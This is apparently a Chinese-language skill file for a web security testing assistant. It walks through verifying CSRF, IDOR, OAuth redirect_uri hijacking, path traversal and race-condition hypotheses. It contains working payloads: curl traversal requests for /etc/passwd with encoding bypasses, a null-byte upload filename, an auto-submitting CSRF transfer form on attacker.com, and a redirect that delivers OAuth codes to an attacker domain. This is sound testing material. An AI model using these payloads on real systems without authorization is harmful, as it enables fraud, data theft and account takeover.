---
description: Web 假设验证 - 脑内推演与最小可行 PoC
tags: [web, hypothesis-tester, logic-proof, minimal-poc, curl, burp]
---

# Web 假设验证 (Hypothesis Tester): 脑内推演与最小可行 PoC

> 不需要真的攻击系统，我们要在头脑里或者用 curl 推演它的崩坏。
> Web 漏洞的验证成本极低——一个 HTTP 请求就能证明服务器推断错了。

## 验证方法论：三段式逻辑推演

每个假设必须经得住这三问：
1. **前提条件是否成立？**（攻击者能否控制 X？）
2. **传递机制是否畅通？**（X 能否影响 Y？）
3. **影响结果是否达成？**（Y 是否导致 Z？）

---

## 假设一：CSRF / 意志不确定性可利用性证明

### 前提条件验证

**问题**：攻击者能否诱导已登录用户向目标端点发送请求？

**推演步骤**：
1. 检查目标端点的 HTTP 方法和 Content-Type：
   - GET 请求 → 可通过 `<img src="...">`、`<a href="...">` 诱导
   - POST + `application/x-www-form-urlencoded` → 可通过自动提交的 `<form>` 诱导
   - POST + `application/json` → 需要检查是否可通过简单请求（text/plain 或 form data）降级

2. 检查 Cookie 的 SameSite 属性：
   ```bash
   curl -I https://victim.com/api/transfer -H "Cookie: session=xxx"
   # 检查 Set-Cookie 响应头中的 SameSite 值
   ```

3. 检查是否存在 CSRF Token：
   ```bash
   # 获取正常页面，提取 CSRF Token
   curl -s https://victim.com/transfer-page | grep -o 'csrf_token[^"]*"[^"]*"' | head -1
   # 尝试不带 Token 请求
   curl -X POST https://victim.com/api/transfer -d "amount=100&to=attacker"
   ```

**逻辑证明**：
```
前提 P1: 端点接受 POST 请求，且可通过 form data 提交
前提 P2: Cookie SameSite=None 或未设置（浏览器默认 Lax，但旧版浏览器可能不同）
前提 P3: 请求不校验 Origin/Referer 头
前提 P4: 不存在有效的 CSRF Token 校验

攻击者构造页面 attacker.com/evil.html:
  <form action="https://victim.com/api/transfer" method="POST">
    <input type="hidden" name="amount" value="10000">
    <input type="hidden" name="to" value="attacker_account">
  </form>
  <script>document.forms[0].submit();</script>

已登录用户访问 attacker.com → 浏览器自动携带 victim.com Cookie → 表单自动提交
服务器收到请求：Cookie 有效 → 无 Origin 校验 → 无 CSRF Token → 执行转账

结论: 假设成立
```

---

## 假设二：IDOR / 失忆困境可利用性证明

### 前提条件验证

**问题**：攻击者能否通过修改资源 ID 访问/操作其他用户的资源？

**推演步骤**：
1. 获取当前用户的一个合法资源 ID：
   ```bash
   curl -s https://victim.com/api/orders -H "Authorization: Bearer TOKEN_A"
   # 记录返回的 order_id，如 1001
   ```

2. 尝试访问相邻 ID：
   ```bash
   curl -s https://victim.com/api/orders/1000 -H "Authorization: Bearer TOKEN_A"
   curl -s https://victim.com/api/orders/1002 -H "Authorization: Bearer TOKEN_A"
   # 如果返回了不属于用户 A 的订单详情 → IDOR 存在
   ```

3. 检查批量操作：
   ```bash
   curl -X POST https://victim.com/api/orders/bulk-delete \
     -H "Content-Type: application/json" \
     -d '{"ids": [1000, 1001, 1002]}'
   # 如果成功删除了不属于用户 A 的订单 → 批量 IDOR 存在
   ```

**逻辑证明**：
```
前提 P1: 资源 ID 可预测（自增整数）或在响应中泄露
前提 P2: 服务器未在查询中绑定 user_id（SELECT * FROM orders WHERE id = ?）
前提 P3: 无其他层（如 Service）做所有权校验

攻击者获取自己的订单 id=1001
    ↓
修改请求为 id=1002
    ↓
服务器查询：SELECT * FROM orders WHERE id = 1002（未加 user_id 条件）
    ↓
返回用户 B 的订单详情

结论: 假设成立
```

---

## 假设三：OAuth redirect_uri 劫持可利用性证明

### 前提条件验证

**问题**：攻击者能否通过构造恶意 redirect_uri 获取用户的授权码？

**推演步骤**：
1. 分析 OAuth 授权 URL 结构：
   ```
   https://victim.com/oauth/authorize?
     client_id=xxx&
     redirect_uri=https://victim.com/callback&
     response_type=code&
     scope=read_write
   ```

2. 测试 redirect_uri 校验严格度：
   ```bash
   # 测试1: 子域名
   curl -I "https://victim.com/oauth/authorize?client_id=xxx&redirect_uri=https://sub.victim.com/callback"
   
   # 测试2: 路径变化
   curl -I "https://victim.com/oauth/authorize?client_id=xxx&redirect_uri=https://victim.com/callback/evil"
   
   # 测试3: 端口变化
   curl -I "https://victim.com/oauth/authorize?client_id=xxx&redirect_uri=https://victim.com:8080/callback"
   
   # 测试4: 域名拼接
   curl -I "https://victim.com/oauth/authorize?client_id=xxx&redirect_uri=https://victim.com.attacker.com/callback"
   ```

3. 如果测试4通过，构造完整攻击：
   ```
   攻击者注册 victim.com.attacker.com
   诱导用户点击：
     https://victim.com/oauth/authorize?client_id=xxx&redirect_uri=https://victim.com.attacker.com/callback
   用户授权后，浏览器重定向到 attacker.com/callback?code=AUTH_CODE
   攻击者获取 code，可换取 access_token
   ```

---

## 假设四：路径穿越 / 语义断层可利用性证明

### 前提条件验证

**问题**：攻击者能否通过构造特殊文件名/路径访问非授权文件？

**推演步骤**：
1. 测试基本路径穿越：
   ```bash
   curl "https://victim.com/api/files/../../../etc/passwd"
   ```

2. 测试 URL 编码绕过：
   ```bash
   curl "https://victim.com/api/files/..%2f..%2f..%2fetc%2fpasswd"
   curl "https://victim.com/api/files/..%252f..%252fetc%252fpasswd"
   ```

3. 测试 Unicode 等价字符：
   ```bash
   curl "https://victim.com/api/files/..%c0%af..%c0%afetc%c0%afpasswd"
   ```

4. 测试空字节截断（上传场景）：
   ```bash
   # 通过文件上传，文件名设为 "../../../app/config.py\x00.jpg"
   curl -X POST https://victim.com/api/upload \
     -F "file=@payload.jpg;filename=../../../app/config.py%00.jpg"
   ```

---

## 假设五：并发竞争 / Race Condition 可利用性证明

### 前提条件验证

**问题**：攻击者能否通过并发请求利用状态推断的时间窗口？

**推演步骤**：
1. 分析目标操作的流程：
   ```
   请求A: SELECT balance FROM accounts WHERE id = 1  → 返回 100
   请求A: UPDATE accounts SET balance = balance - 100 WHERE id = 1
   
   请求B: SELECT balance FROM accounts WHERE id = 1  → 也返回 100（在A的UPDATE前）
   请求B: UPDATE accounts SET balance = balance - 100 WHERE id = 1
   ```

2. 使用并发工具测试：
   ```bash
   # 使用 parallel 或编写脚本同时发送两个请求
   curl -X POST https://victim.com/api/redeem -d "coupon=SAVE50" &
   curl -X POST https://victim.com/api/redeem -d "coupon=SAVE50" &
   wait
   # 如果两个请求都成功，且余额/库存被扣减两次 → Race Condition 存在
   ```

3. 检查是否有乐观锁：
   ```bash
   # 查看响应中是否包含 version 字段
   # 尝试修改 version 或重复发送相同 version 的请求
   ```

---

## 专家推演工具箱

### 最小 HTTP 请求模板

```bash
# 基础 GET
curl -s -o /dev/null -w "%{http_code}" https://target.com/api/resource

# 带认证头的 GET
curl -s -H "Authorization: Bearer $TOKEN" https://target.com/api/resource

# POST JSON
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"key":"value"}' https://target.com/api/action

# POST form data (简单请求，不触发预检)
curl -s -X POST -d "key=value" https://target.com/api/action

# 跨域测试（从攻击者域名视角）
curl -s -H "Origin: https://attacker.com" \
  -H "Cookie: session=xxx" \
  -I https://target.com/api/resource
# 检查响应中的 Access-Control-Allow-Origin

# 检查 SameSite（查看 Set-Cookie 头）
curl -s -I -H "Cookie: session=xxx" https://target.com/api/resource | grep -i set-cookie
```

### 无害 PoC 原则

| 验证目标 | 无害 Payload | 预期结果 |
|---------|------------|---------|
| CSRF | 自动提交表单到目标端点，参数设为测试值 | 服务器返回 200/成功，证明无 CSRF 保护 |
| IDOR | 访问 id+1 的资源 | 返回他人数据或不属于当前用户的资源 |
| CORS | `Origin: https://attacker.com` + `withCredentials: true` | 响应包含 `Access-Control-Allow-Origin: https://attacker.com` |
| 路径穿越 | `../../../etc/hostname` | 返回主机名或 404（证明路径解析到达文件系统层） |
| Race Condition | 同时发送两个 redeem 请求 | 两个请求都成功 |

## 输出要求

1. **三段式逻辑证明**：前提条件 → 传递机制 → 影响结果，每步标注"成立/不成立/需验证"
2. **curl 命令清单**：可直接复制执行的无害验证命令
3. **反证思考**：在什么条件下这个假设不成立？（如 SameSite=Strict + CSRF Token）
4. **预期响应 vs 实际响应**：列出验证时的 HTTP 状态码和响应体特征
